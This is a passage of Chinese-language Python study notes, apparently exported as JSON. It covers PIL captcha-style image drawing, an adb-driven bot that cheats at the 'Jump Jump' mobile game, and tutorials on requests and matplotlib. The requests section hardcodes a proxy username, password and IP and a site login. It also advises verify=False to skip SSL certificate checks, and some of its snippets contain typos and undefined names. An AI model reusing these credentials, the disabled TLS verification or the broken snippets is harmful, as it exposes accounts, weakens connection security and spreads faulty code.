ImageDraw\nfrom PIL import ImageFont\nimport random\n\ndef getRandomColor():\n    '''获取一个随机颜色(r,g,b)格式的'''\n    c1 = random.randint(0,255)\n    c2 = random.randint(0,255)\n    c3 = random.randint(0,255)\n    return (c1,c2,c3)\n\n\ndef getRandomStr():\n    '''获取一个随机字符串，每个字符的颜色也是随机的'''\n    random_num = str(random.randint(0, 9))\n    random_low_alpha = chr(random.randint(97, 122))\n    random_upper_alpha = chr(random.randint(65, 90))\n    random_char = random.choice([random_num, random_low_alpha, random_upper_alpha])\n    return random_char\n\n# 获取一个Image对象，参数分别是RGB模式。宽150，高30，随机颜色\nimage = Image.new('RGB',(150,30),getRandomColor())\n\n# 获取一个画笔对象，将图片对象传过去\ndraw = ImageDraw.Draw(image)\n\n# 获取一个font字体对象参数是ttf的字体文件的目录，以及字体的大小\nfont=ImageFont.truetype(\"kumo.ttf\",size=26)\n\nfor i in range(5):\n    # 循环5次，获取5个随机字符串\n    random_char = getRandomStr()\n\n    # 在图片上一次写入得到的随机字符串,参数是：定位，字符串，颜色，字体\n    draw.text((10+i*30, 0),random_char , getRandomColor(), font=font)\n\n# 保存到硬盘，名为test.png格式为png的图片\nimage.save(open('test.png','wb'),'png')\n```\n效果：\n![](https://gitee.com/naiswang/images/raw/master/20190926191604.png)\n\n\n# 实战：跳一跳外挂\n```python\nimport subprocess\nfrom PIL import Image\nimport random\nimport os\nimport time\n\nimg_height = 0\nimg_wight = 0\nimg_pixel = ()\n\nchess_center = ()\ndish_center = ()\n\nimg = 0\n\n\ndef get_screenShot():\n\tprocess = subprocess.Popen(\"adb shell screencap -p\", shell=True, stdout=subprocess.PIPE)\n\tscreen_shot = process.stdout.read()\n\t# 命令行显示的干扰\n\tscreen_shot = screen_shot.replace(b\"\\r\\n\", b\"\\n\")\n\twith open(\"fff.png\", \"wb\") as fp:\n\t\tfp.write(screen_shot)\n\tglobal img\n\timg = Image.open(\"fff.png\")\n\tglobal img_wight\n\tglobal img_height\n\tglobal img_pixel\n\timg_wight, img_height = img.size\n\timg_pixel = img.load()\n\n\ndef find_chess():\n\tchess_left = ()\n\tchess_right = ()\n\tflag = False\n\tleftflag: bool = False\n\tfor y in range(600, img_height):\n\t\tif flag:\n\t\t\tbreak\n\t\tfor x in range(270, img_wight):\n\t\t\tpixel = img_pixel[x, y]\n\t\t\tif 51 <= pixel[0] <= 54 and 51 <= pixel[1] <= 54 and 55 <= pixel[2] <= 59 and leftflag == False:\n\t\t\t\tchess_left = (x, y)\n\t\t\t\tleftflag = True\n\t\t\t\tcontinue\n\t\t\telif leftflag:\n\t\t\t\tchess_right = (x - 1, y)\n\t\t\t\tflag = True\n\t\t\t\tbreak\n\tglobal chess_center\n\tchess_center = (int((chess_left[0] + chess_right[0]) / 2), chess_left[1]+208)\n\n\ndef find_dish():\n\tbd = img_pixel[100, 400]\n\tfor y in range(400, img_height):\n\t\tfor x in range(100, img_wight):\n\t\t\tpixel = img_pixel[x, y]\n\t\t\tif pixel[0] >= bd[0] + 5 or pixel[0] <= bd[0] - 5 or pixel[1] >= bd[1] + 5 or pixel[1] <= bd[1] - 5 or \\\n\t\t\t\t\tpixel[2] >= bd[2] + 5 or pixel[\n\t\t\t\t2] <= bd[2] - 5:\n\t\t\t\tglobal dish_center\n\t\t\t\tdish_center = (x, y+131)\n\t\t\t\treturn\n\t\t\tbd = pixel\n\ndef jump(distance):\n\tpress_time = distance * 1.392\n\tpress_time = int(max(press_time, 200))\n\tpoint = (random.randint(253, 860), random.randint(1520, 1839))\n\tcmd = \"adb shell input swipe {x1} {y1} {x2} {y2} {time}\".format(\n\t\tx1=point[0],\n\t\ty1=point[1],\n\t\tx2=point[0] + random.randint(10, 20),\n\t\ty2=point[1] + random.randint(10, 20),\n\t\ttime=press_time\n\t)\n\tos.system(cmd)\n\n\nif __name__ == '__main__':\n\twhile True:\n\t\tget_screenShot()\n\t\tfind_chess()\n\t\tfind_dish()\n\t\tprint(\"{x} -> {y}\".format(x=chess_center, y=dish_center))\n\t\tdistance = (((dish_center[0] - chess_center[0]) ** 2) + ((dish_center[1] - chess_center[1]) ** 2)) ** 0.5\n\t\t# img.putpixel(dish_center, (255, 255, 255))\n\t\t# img.putpixel(chess_center, (255, 255, 255))\n\t\t# img.show()\n\t\tjump(distance)\n\t\ttime.sleep(random.randint(1, 2))\n```"
  },
  {
    "title": "./notes/python库/requests.md",
    "body": "# 简介\n虽然Python的标准库中 urllib2 模块已经包含了平常我们使用的大多数功能，但是它的 API 使用起来让人感觉不太好，而 Requests 自称 “HTTP for Humans”，说明使用更简洁方便。\n\nRequests 继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码。\n\nrequests 的底层实现其实就是 urllib3\nRequests的文档非常完备，中文文档也相当不错。Requests能完全满足当前网络的需求，支持Python 2.6—3.5，而且能在PyPy下完美运行。\n开源地址：https://github.com/kennethreitz/requests\n中文文档 API： http://docs.python-requests.org/zh_CN/latest/index.html\n\n安装方式\n利用 pip 安装 或者利用 easy_install 都可以完成安装：\n```python\n$ pip install requests\n$ easy_install requests\n```\n\n# 基本GET请求（headers参数和parmas参数）\n**1. 最基本的GET请求可以直接用get方法**\n```python\nresponse = requests.get(\"http://www.baidu.com/\")\n\n# 也可以这么写\n# response = requests.request(\"get\", \"http://www.baidu.com/\")\n```\n\n**2. 添加 headers 和 查询参数**\n如果想添加 headers，可以传入`headers`参数来增加请求头中的headers信息。如果要将参数放在url中传递，可以利用 `params` 参数。\n```python\nimport requests\n\nkw = {'wd':'长城'}\n\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\"}\n\n# params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()\nresponse = requests.get(\"http://www.baidu.com/s?\", params = kw, headers = headers)\n\n# 查看响应内容，response.text 返回的是Unicode格式的数据\nprint response.text\n\n# 查看响应内容，response.content返回的字节流数据\nprint respones.content\n\n# 查看完整url地址\nprint response.url\n\n# 查看响应头部字符编码\nprint response.encoding\n\n# 查看响应码\nprint response.status_code\n```\n\n> - 使用response.text 时，Requests 会基于 HTTP 响应的文本编码自动解码响应内容，大多数 Unicode 字符集都能被无缝地解码。\n> - 使用response.content 时，返回的是服务器响应数据的原始二进制字节流，可以用来保存图片等二进制文件。\n\n# 基本POST请求（data参数）\n**1. 最基本的GET请求可以直接用post方法**\n```python\nresponse = requests.post(\"http://www.baidu.com/\", data = data)\n```\n\n**2. 传入data数据**\n对于 POST 请求来说，我们一般需要为它增加一些参数。那么最基本的传参方法可以利用 `data` 这个参数。\n```python\nimport requests\n\nformdata = {\n    \"type\":\"AUTO\",\n    \"i\":\"i love python\",\n    \"doctype\":\"json\",\n    \"xmlVersion\":\"1.8\",\n    \"keyfrom\":\"fanyi.web\",\n    \"ue\":\"UTF-8\",\n    \"action\":\"FY_BY_ENTER\",\n    \"typoResult\":\"true\"\n}\n\nurl = \"http://fanyi.youdao.com/translate?smartresult=dict&smartresult=rule&smartresult=ugc&sessionFrom=null\"\n\nheaders={ \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"}\n\nresponse = requests.post(url, data = formdata, headers = headers)\n\nprint response.text\n\n# 如果是json文件可以直接显示\nprint response.json()\n```\n\n# 代理（proxies参数）\n如果需要使用代理，你可以通过为任意请求方法提供 `proxies` 参数来配置单个请求：\n```python\nimport requests\n\n# 根据协议类型，选择不同的代理\nproxies = {\"http\": \"http://12.34.56.79:9527\"}\n\nresponse = requests.get(\"http://www.baidu.com\", proxies = proxies)\nprint response.text\n```\n\n也可以通过本地环境变量 `HTTP_PROXY` 和 `HTTPS_PROXY` 来配置代理：\n```bash\nexport HTTP_PROXY=\"http://12.34.56.79:9527\"\nexport HTTPS_PROXY=\"https://12.34.56.79:9527\"\n```\n\n# 私密代理验证（特定格式） 和 Web客户端验证（auth 参数）\nurllib2 这里的做法比较复杂，requests只需要一步：\n## 私密代理\n```python\nimport requests\n\n# 如果代理需要使用HTTP Basic Auth，可以使用下面这种格式：\nproxy = { \"http\": \"mr_mao_hacker:sffqry9r@61.158.163.130:16816\" }\n\nresponse = requests.get(\"http://www.baidu.com\", proxies = proxy)\n\nprint response.text\n```\n\n## web客户端验证\n如果是Web客户端验证，需要添加 auth = (账户名, 密码)\n```python\nimport requests\n\nauth=('test', '123456')\n\nresponse = requests.get('http://192.168.199.107', auth = auth)\n\nprint response.text\n```\n\n# Cookies\n如果一个响应中包含了cookie，那么我们可以利用 cookies参数拿到：\n```python\nimport requests\n\nresponse = requests.get(\"http://www.baidu.com/\")\n\n# 7. 返回CookieJar对象:\ncookiejar = response.cookies\n\n# 8. 将CookieJar转为字典：\ncookiedict = requests.utils.dict_from_cookiejar(cookiejar)\n\nprint cookiejar\n\nprint cookiedict\n```\n运行结果：\n\n```python\n<RequestsCookieJar[<Cookie BDORZ=27315 for .baidu.com/>]>\n\n{'BDORZ': '27315'}\n```\n\n# Session\n在 requests 里，session对象是一个非常常用的对象，这个对象代表一次用户会话：从客户端浏览器连接服务器开始，到客户端浏览器与服务器断开。\n会话能让我们在跨请求时候保持某些参数，比如在同一个 Session 实例发出的所有请求之间保持 cookie 。\n\n实现人人网登录\n```python\nimport requests\n\n# 1. 创建session对象，可以保存Cookie值\nssion = requests.session()\n\n# 2. 处理 headers\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\"}\n\n# 3. 需要登录的用户名和密码\ndata = {\"email\":\"mr_mao_hacker@163.com\", \"password\":\"alarmchime\"}  \n\n# 4. 发送附带用户名和密码的请求，并获取登录后的Cookie值，保存在ssion里\nssion.post(\"http://www.renren.com/PLogin.do\", data = data)\n\n# 5. ssion包含用户登录后的Cookie值，可以直接访问那些登录后才可以访问的页面\nresponse = ssion.get(\"http://www.renren.com/410043129/profile\")\n\n# 6. 打印响应内容\nprint response.text\n```\n\n# 处理HTTPS请求SSL证书验证\nRequests也可以为HTTPS请求验证SSL证书：\n- 要想检查某个主机的SSL证书，你可以使用 verify 参数（也可以不写）\n```python\nimport requests\nresponse = requests.get(\"https://www.baidu.com/\", verify=True)\n\n# 也可以省略不写\n# response = requests.get(\"https://www.baidu.com/\")\nprint r.text\n```\n运行结果：\n```\n<!DOCTYPE html>\n<!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8><meta http-equiv=X-UA-Compatible content=IE=Edge>百度一下，你就知道 ....\n```\n- 如果SSL证书验证不通过，或者不信任服务器的安全证书，则会报出SSLError，据说 12306 证书是自己做的：\n来测试一下：\n```python\nimport requests\nresponse = requests.get(\"https://www.12306.cn/mormhweb/\")\nprint response.text\n```\n果然：\n```\nSSLError: (\"bad handshake: Error([('SSL routines', 'ssl3_get_server_certificate', 'certificate verify failed')],)\",)\n```\n**如果我们想跳过 12306 的证书验证，把 verify 设置为 False 就可以正常请求了。**\n```python\nr = requests.get(\"https://www.12306.cn/mormhweb/\", verify = False)\n```\n"
  },
  {
    "title": "./notes/python库/matplotlib.md",
    "body": "---\ntitle: matplotlib\ndate: 2019/12/1\nupdate: {{ date }}\ncategories:\n - back-end\n - python\n---\n# 什么是matplotlib\n1. 能将数据进行可视化，更直观的呈现\n2. 使数据更加客观、更具说服力\nmatplotlib： 最流行的Python底层绘图库，主要做数据可视化图表，名字取材于MATLAB，模仿MATLAB构建\n\n# 折线图\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015131905.png\"/>\n每个红色的点是坐标，把5个点的坐标连接成一条线，组成了一个折线图\n那么到底如何把它通过代码画出来呢？\n通过下面的小例子我们来看一下matplotib该如何简单的使用\n假设一天中每隔两个小时（range（2，26，2））的气温（C）分别是[15，13，14.5，17，20，25，26，26，27，22，18，15]\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015133548.png\"/>\n执行后的图形：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015133900.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015134243.png\"/>\n\n## 设置图片大小，保存图片、清晰度\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015135554.png\"/>\n其中figsize表示的时图像的大小，参数分别是宽与高\n保存图片代码plt.savefig()一定要在plt.plot()后执行\n\n## 调整X或者Y轴上的刻度\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015141455.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015145418.png\"/>\n其中rotation=90是指逆时针旋转90度\n效果：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015145609.png\"/>\n可以发现其中的汉字无法显示出来\n\n## 设置中文显示\n为什么无法显示中文：\nmatpfoib默认不支持中文字符，因为默认的英文字体无法显示汉字\n\n查看linux/mac下面支持的字体：\nfc-list ->查看支持的字体\nfc-list :lang=zh ->查看支持的中文（冒号前面有空格）\n\n那么问题来了：如何修改matplotib的默认字体？\n1. 通过matplotlib.rc可以修改，具体方法参见源码（windows/linux）\n2. 通过matplotib下的font manager可以解决（windows/linux/mac）\n3. 通过plt.rcParams['font.sans-serif'] = ['SimHei'] 来解决\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015154445.png\"/>\n\n## 给图像添加描述信息\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015155117.png\"/>\n\n## 自定义绘制图形的风格\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015164615.png\"/>\n\n## 添加图例\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015165114.png\"/>\nlegend中常用参数\n```python\nl1, = plt.plot(x, y1, label='linear line')\nl2, = plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--', label='square line')\n\nplt.legend(handles=[l1, l2], labels=['up', 'down'],  loc='best')\n```\n需要注意的是 l1, l2,要以逗号结尾, 因为plt.plot() 返回的是一个列表.\n\n## 实战：\n```python\nfrom matplotlib import pyplot as plt\nimport random\nimport matplotlib\nfrom matplotlib import font_manager\n\nfont = {\n\t'family': 'MicroSoft Yahei',\n\t'size': '10'\n}\nmatplotlib.rc(\"font\", **font)\n\nplt.figure(figsize=(10, 5))\n\nx = range(11, 31)\ny_1 = [1, 0, 1, 1, 1, 2, 4, 3, 2, 3, 4, 4, 5, 5, 5, 3, 3, 1, 1, 1]\ny_2 = [1, 1, 2, 4, 2, 2, 4, 3, 1, 2, 1, 2, 2, 1, 1, 1, 1, 1, 1, 1]\n\nplt.plot(x, y_1, label=\"自己\")\nplt.plot(x, y_2, label=\"同桌\")\n\n_x_ticks = [\"{} years old\".format(i) for i in x]\nplt.xticks(x, _x_ticks, rotation=45)\n\nplt.xlabel(\"time\")\nplt.ylabel(\"number\")\n\n# Draw grid. The alpha argument indicate the transparency of grid lines\nplt.grid(alpha=0.4)\n\n# add the legend. The loc alpha argument indicate the location of the legend. The default is in\n# the upper right corner.\nplt.legend(loc=\"upper left\")\n\nplt.show()\n```\n效果：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015164429.png\"/>\n\n## 总结\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015165305.png\"/>\n\n# 对比常用统计图\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015170041.png\"/>\n\n# 绘制散点图\n\n```python\n# draw the scatter chart\nplt.scatter(x, y_1, label=\"自己\")\nplt.scatter(x, y_2, label=\"同桌\")\n```\n散点图plt.scatter的一些属性：\nx：指定散点图的x轴数据；\ny：指定散点图的y轴数据；\ns：指定散点图点的大小，默认为20，通过传入新的变量，实现气泡图的绘制；\nc：可用于不同类别的颜色，指定散点图点的颜色，默认为蓝色；可以是一个颜色列表。\nmarker：指定散点图点的形状，默认为圆形；\ncmap：指定色图，只有当c参数是一个浮点型的数组的时候才起作用；\nalpha：设置散点的透明度；\nlinewidths：设置散点边界线的宽度；\nedgecolors：设置散点边界线的颜色；\n\n# 绘制条形图\n```python\n# draw the bar chart\n# the bar and barh functions represent the horizontal and vertical distribution of the bars respectively\n# the width or the height indicates the thickness of bar\nplt.bar(x, y_1, width=0.3, label=\"自己\")\nplt.barh(x, y_1, height=0.3, label=\"自己\")\n```\n\n实战\n```\nfrom matplotlib import pyplot as plt\nimport matplotlib\n\nfont = {\n\t'family': 'MicroSoft Yahei',\n\t'size': '10'\n}\nmatplotlib.rc(\"font\", **font)\n\na = [\"理球耀起3：终极之战\", \"教刻尔克\", \"戴蛛侠：英雄归来\", \"战狼2\"]\nb_16 = [1222, 44, 42, 221]\nb_15 = [232, 424, 142, 121]\nb_14 = [5222, 241, 32, 21]\n\nbar_width = 0.2\n\ny_14 = range(len(a))\ny_15 = [i + bar_width for i in range(len(a))]\ny_16 = [i + bar_width * 2 for i in range(len(a))]\n\nplt.barh(y_14, b_14, height=bar_width, label=\"14\")\nplt.barh(y_15, b_15, height=bar_width, label=\"15\")\nplt.barh(y_16, b_16, height=bar_width, label=\"16\")\n\nplt.yticks(y_15, a)\nplt.grid()\nplt.legend()\nplt.show()\n```\n效果\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015193116.png\"/>\n\n# 直方图\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191015202711.png\"/>\n\n# 更多的图形样式\nmatplotlib支持的图形是非常多的，如果有其他的需求，我们可以查看一下url地址：\nhttp://matplotlib.org/gallery/index.html\n\n# add_subplot方法\n```python\nimport matplotlib.pyplot as plt\nfrom numpy import *\nfig = plt.figure()\nax = fig.add_subplot(349)\nax.plot(x,y)\nplt.show()\n```\n引數349的意思是：將畫布分割成3行4列，影象畫在從左到右從上到下的第9塊\n\n# Matplotlib中的annotate（注解）的用法\nannotate用于在图形上给数据添加文本注解，而且支持带箭头的划线工具，方便我们在合适的位置添加描述信息。\n\n参数说明：\n```\nAxes.annotate(s, xy, *args, **kwargs)\ns：注释文本的内容\nxy：被注释的坐标点，二维元组形如(x,y)\nxytext：注释文本的坐标点，也是二维元组，默认与xy相同\nxycoords：被注释点的坐标系属性，\n```\n## xycoords\n|属性值|含义 |\n|'figure points'|以绘图区左下角为参考，单位是点数|\n|'figure pixels'|以绘图区左下角为参考，单位是像素数|\n|'figure fraction'|以绘图区左下角为参考，单位是百分比|\n|'axes points'|以子绘图区左下角为参考，单位是点数（一个figure可以有多个axex，默认为1个）|\n|'axes pixels'|以子绘图区左下角为参考，单位是像素数|\n|'axes fraction'|以子绘图区左下角为参考，单位是百分比|\n|'data'|以被注释的坐标点xy为参考 (默认值)|\n|'polar'|不使用本地数据坐标系，使用极坐标系|\n\n## textcoords\n注释文本的坐标系属性，默认与xycoords属性值相同，也可设为不同的值。除了允许输入xycoords的属性值，还允许输入以下两种：\n|属性值|含义|\n|'offset points'|相对于被注释点xy的偏移量（单位是点）|\n|'offset pixels'|相对于被注释点xy的偏移量（单位是像素）|\n\n## arrowprops\n箭头的样式，dict（字典）型数据，如果该属性非空，则会在注释文本和被注释点之间画一个箭头。如果不设置'arrowstyle' 关键字，则允许包含以下关键字：\n\n|   关键字    |                       说明                       |\n| ---------- | ------------------------------------------------ |\n| width      | 箭头的宽度（单位是点）                               |\n| headwidth  | 箭头头部的宽度（点）                                |\n| headlength | 箭头头部的长度（点）                                |\n| shrink     | 箭头两端收缩的百分比（占总长）                       |\n| ?          | 任何 matplotlib.patches.FancyArrowPatch中的关键字 |\n\n如果设置了‘arrowstyle’关键字，以上关键字就不能使用。允许的值有：\n\n| 箭头的样式 |                     属性                      |\n| --------- | --------------------------------------------- |\n| '-'       | None                                          |\n| '->'      | head_length=0.4,head_width=0.2                |\n| '-['      | widthB=1.0,lengthB=0.2,angleB=None            |\n| '         | -                                             |\n| '-        | >'                                            |\n| '<-'      | head_length=0.4,head_width=0.2                |\n| '<->'     | head_length=0.4,head_width=0.2                |\n| '<        | -'                                            |\n| '<        | -                                             |\n| 'fancy'   | head_length=0.4,head_width=0.4,tail_width=0.4 |\n| 'simple'  | head_length=0.5,head_width=0.5,tail_width=0.2 |\n| 'wedge'   | tail_width=0.3,shrink_factor=0.5              |\n\n## FancyArrowPatch的关键字包括:\n\n|       Key       |                                      Description                                      |\n| --------------- | ------------------------------------------------------------------------------------- |\n| arrowstyle      | 箭头的样式                                                                             |\n| connectionstyle | 连接线的样式                                                                           |\n| relpos          | 箭头起始点相对注释文本的位置，默认为 (0.5, 0.5)，即文本的中心，（0，0）表示左下角，（1，1）表示右上角 |\n| patchA          | 箭头起点处的图形（matplotlib.patches对象），默认是注释文字框                                 |\n| patchB          | 箭头终点处的图形（matplotlib.patches对象），默认为空                                        |\n| shrinkA         | 箭头起点的缩进点数，默认为2                                                              |\n| shrinkB         | 箭头终点的缩进点数，默认为2                                                              |\n| mutation_scale  | default is text size (in points)                                                      |\n| mutation_aspect | default is 1.                                                                         |\n| ?               | any key for matplotlib.patches.PathPatch                                              |\n\n## annotation_clip \nannotation_clip : 布尔值，可选参数，默认为空。设为True时，只有被注释点在子图区内时才绘制注释；设为False时，无论被注释点在哪里都绘制注释。仅当xycoords为‘data’时，默认值空相当于True。\n\n\n返回值：\nAnnotation对象\n\n## 示例：\n```python\n一个基本的注释示例，设置了箭头的颜色和缩进，感兴趣的话可以以此为基础尝试更多的属性和样式。\nimport numpy as np\nimport matplotlib.pyplot as plt\n \nfig, ax = plt.subplots()\n \n# 绘制一个余弦曲线\nt = np.arange(0.0, 5.0, 0.01)\ns = np.cos(2*np.pi*t)\nline, = ax.plot(t, s, lw=2)\n \n# 绘制一个黑色，两端缩进的箭头\nax.annotate('local max', xy=(2, 1), xytext=(3, 1.5),\n            xycoords='data',\n            arrowprops=dict(facecolor='black', shrink=0.05)\n            )\nax.set_ylim(-2, 2)\nplt.show()\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191027111744.png\"/>\n\n坐标转换示例——在本例中，我们学习用不同的坐标体系绘制注释。\n```python\nimport numpy as np\nimport matplotlib.pyplot as plt\n \n# 以步长0.005绘制一个曲线\nx = np.arange(0, 10, 0.005)\ny = np.exp(-x/2.) * np.sin(2*np.pi*x)\n \nfig, ax = plt.subplots()\nax.plot(x, y)\nax.set_xlim(0, 10)\nax.set_ylim(-1, 1)\n \n# 被注释点的数据轴坐标和所在的像素\nxdata, ydata = 5, 0\nxdisplay, ydisplay = ax.transData.transform_point((xdata, ydata))\n \n# 设置注释文本的样式和箭头的样式\nbbox = dict(boxstyle=\"round\", fc=\"0.8\")\narrowprops = dict(\n    arrowstyle = \"->\",\n    connectionstyle = \"angle,angleA=0,angleB=90,rad=10\")\n \n# 设置偏移量\noffset = 72\n# xycoords默认为'data'数据轴坐标，对坐标点（5,0）添加注释\n# 注释文本参考被注释点设置偏移量，向左2*72points，向上72points\nax.annotate('data = (%.1f, %.1f)'%(xdata, ydata),\n            (xdata, ydata), xytext=(-2*offset, offset), textcoords='offset points',\n            bbox=bbox, arrowprops=arrowprops)\n \n# xycoords以绘图区左下角为参考，单位为像素\n# 注释文本参考被注释点设置偏移量，向右0.5*72points，向下72points\ndisp = ax.annotate('display = (%.1f, %.1f)'%(xdisplay, ydisplay),\n            (xdisplay, ydisplay), xytext=(0.5*offset, -offset),\n            xycoords='figure pixels',\n            textcoords='offset points',\n            bbox=bbox, arrowprops=arrowprops)\n \n \nplt.show()\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191027111829.png\"/>\n极坐标上的注释——在此例中，我们会在极坐标系绘图，并在极坐标系设置被注释点，以绘图区的百分比为参数放置注释文本。\n```python\nimport numpy as np\nimport matplotlib.pyplot as plt\n \n# 绘制一个极地坐标，再以0.001为步长，画一条螺旋曲线\nfig = plt.figure()\nax = fig.add_subplot(111, polar=True)\nr = np.arange(0,1,0.001)\ntheta = 2 * 2*np.pi * r\nline, = ax.plot(theta, r, color='#ee8d18', lw=3)\n \n# 对索引为800处画一个圆点，并做注释\nind = 800\nthisr, thistheta = r[ind], theta[ind]\nax.plot([thistheta], [thisr], 'o')\nax.annotate('a polar annotation',\n            xy=(thistheta, thisr),  # 被注释点遵循极坐标系，坐标为角度和半径\n            xytext=(0.05, 0.05),    # 注释文本放在绘图区的0.05百分比处\n            textcoords='figure fraction',\n            arrowprops=dict(facecolor='black', shrink=0.05),# 箭头线为黑色，两端缩进5%\n            horizontalalignment='left',# 注释文本的左端和低端对齐到指定位置\n            verticalalignment='bottom',\n            )\nplt.show()\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191027111912.png\"/>\n\n不同样式的注释文本示例\n```python\nimport matplotlib.pyplot as plt\n \n# 设置绘图区标题\nfig = plt.figure()\nfig.suptitle('bold figure suptitle', fontsize=14, fontweight='bold')\n \n# 设置子绘图区标题\nax = fig.add_subplot(111)\nfig.subplots_adjust(top=0.85)\nax.set_title('axes title')\n \n# 设置x y坐标轴的标识\nax.set_xlabel('xlabel')\nax.set_ylabel('ylabel')\n \n# 红色、透明度0.5、边框留白10\nax.text(3, 8, 'boxed italics text in data coords', style='italic',\n        bbox={'facecolor':'red', 'alpha':0.5, 'pad':10})\n \n# 文字中有数学公式\nax.text(2, 6, r'an equation: $E=mc^2$', fontsize=15)\n \n# 文字中有ASCII码\nax.text(3, 2, 'unicode: Institut f\\374r Festk\\366rperphysik')\n \n# 转换坐标系\nax.text(0.95, 0.01, 'colored text in axes coords',\n        verticalalignment='bottom', horizontalalignment='right',\n        transform=ax.transAxes,\n        color='green', fontsize=15)\n \n# 在2,1处画个圆点，添加注释\nax.plot([2], [1], 'o')\nax.annotate('annotate', xy=(2, 1), xytext=(3, 4),\n            arrowprops=dict(facecolor='black', shrink=0.05))\n \nax.axis([0, 10, 0, 10])\n \nplt.show()\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191027111957.png\"/>\n\n# 绘制树的图形\n```python\n# draw decision tree by matplotlib\n# define the type of textbox and arrow\ndecision_node = dict(boxstyle='sawtooth', fc='0.8')\nleaf_node = dict(boxstyle='round4', fc='0.8')\narrow_args = dict(arrowstyle='<-')\nplt.rcParams['font.sans-serif'] = ['SimHei']\n\n#%%\n\n# get count of leaf nodes\ndef get_num_leaf(tree):\n\tnum_leaf = 0 # initialize the number of leaf nodes\n\tfeat = next(iter(tree)) # get the first node of decision tree\n\tfeat_value = tree[feat]\n\tfor key in feat_value.keys():\n\t\t if type(feat_value[key]) == dict:\n\t\t\t num_leaf += get_num_leaf(feat_value[key])\n\t\t else:\n\t\t\t num_leaf += 1\n\treturn num_leaf\n# print(deci_tree)\n# get_num_leaf(deci_tree)\n\n#%%\n\n# get max depth of tree\ndef get_tree_depth(tree):\n\tmax_depth = 0\n\tfeat = next(iter(tree)) # get the first node of decision tree\n\tfeat_value = tree[feat]\n\tfor key in feat_value.keys():\n\t\t if type(feat_value[key]) == dict:\n\t\t\t this_depth = 1 + get_tree_depth(feat_value[key])\n\t\t else:\n\t\t\t this_depth = 1\n\t\t if this_depth > max_depth:\n\t\t\t max_depth = this_depth\n\treturn max_depth\n\n# get_tree_depth(deci_tree)\n\t\n\n#%%\n\n# draw node \ndef plot_node(node_text, text_position, parent_position, node_type):\n\tcreate_plot.ax1.annotate(s=node_text, xy=parent_position, xycoords='axes fraction',\n\t\t\t\t\t\t\t xytext=text_position, textcoords='axes fraction',\n\t\t\t\t\t\t\t va='center', ha='center', bbox=node_type, arrowprops=arrow_args)\n\t\n\n\n#%%\n\ndef plot_mid_text(cntr_pt, parent_pt, text_string):\n\tx_mid = (parent_pt[0] - cntr_pt[0])/2 +cntr_pt[0]\n\ty_mid = (parent_pt[1] - cntr_pt[1])/2 +cntr_pt[1]\n\tcreate_plot.ax1.text(x_mid, y_mid, text_string)\n\n\n#%%\n\ndef plot_tree(tree, parent_pt, node_text):\n\tnum_leaf = get_num_leaf(tree)\n\tdepth = get_tree_depth(tree)\n\tfirst_str = next(iter(tree))\n\tprint(first_str)\n\tcenter_pt = (plot_tree.xOff + (1.0 + float(num_leaf))/2.0/plot_tree.totalW, plot_tree.yOff)\n\tplot_mid_text(center_pt, parent_pt, node_text)\n\tplot_node(first_str, center_pt, parent_pt, decision_node)\n\tsecond_dict = tree[first_str]\n\tplot_tree.yOff = plot_tree.yOff - 1.0/plot_tree.totalD\n\tfor key in second_dict.keys():\n\t\tif type(second_dict[key]) == dict:\n\t\t\tplot_tree(second_dict[key], center_pt, str(key))\n\t\telse:\n\t\t\tplot_tree.xOff = plot_tree.xOff + 1.0/plot_tree.totalW\n\t\t\tplot_node(second_dict[key], (plot_tree.xOff, plot_tree.yOff), center_pt, leaf_node)\n\t\t\tplot_mid_text((plot_tree.xOff, plot_tree.yOff), center_pt, str(key))\n\tplot_tree.yOff = plot_tree.yOff + 1.0/plot_tree.totalD\n\n#%%\n\ndef create_plot(tree):\n\tfig = plt.figure(1, facecolor='white')\n\tfig.clf()\n\taxprops = dict(xticks=[], yticks=[])\n\tcreate_plot.ax1 = plt.subplot(111, frameon=False, **axprops)\n\tplot_tree.totalW = float(get_num_leaf(tree))\n\tplot_tree.totalD = float(get_tree_depth(tree))\n\tprint(plot_tree.totalW)\n\tprint(plot_tree.totalD)\n\tplot_tree.xOff = -0.5/plot_tree.totalW\n\tplot_tree.yOff = 1\n\tplot_tree(tree, (0.5, 